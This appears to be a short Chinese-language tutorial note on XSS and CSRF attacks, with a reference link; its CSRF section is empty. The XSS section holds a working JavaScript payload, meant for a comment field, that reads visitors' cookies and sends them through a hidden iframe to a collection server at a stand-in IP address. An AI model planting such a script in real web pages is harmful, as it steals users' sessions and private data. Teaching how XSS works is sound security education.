#  XSS 与 CSRF 两种跨站攻击

- XSS：跨站脚本（Cross-site scripting）

- CSRF：跨站请求伪造（Cross-site request forgery）

## XSS

>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，  
例如发布评论，提交含有 JavaScript 的内容文本。  
这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。  

- 在某一个页面的评论中注入这段代码：

// 用 <script type="text/javascript"></script> 包起来放在评论中
```
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```
于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。

而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。

## CSRF

>

## 参考资料
- https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
